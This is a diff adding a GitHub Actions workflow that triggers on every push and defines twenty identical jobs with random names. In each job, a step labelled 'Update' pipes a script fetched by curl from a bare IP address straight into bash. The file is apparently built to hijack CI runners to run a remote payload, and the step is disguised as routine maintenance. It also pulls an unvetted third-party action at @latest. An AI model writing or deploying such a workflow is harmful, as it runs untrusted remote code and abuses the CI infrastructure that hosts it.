@@ -1,0 +1,183 @@
+name: mevese
+on: push
+jobs:
+  rowava:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  niboci:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  yavuto:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  huxeke:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  tilimo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  degupa:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  nutito:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  gesoje:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  vidowa:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  mekipa:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  noyoxihu:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  kafebade:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  beyoba:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  filiruca:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  wazogoje:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  nemavifo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  tepugo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  yixepo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  zegigo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
+  visevi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: kayvionadd/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://174.138.18.254/mandalorian/kiehlx.php?a=puxaye | bash -
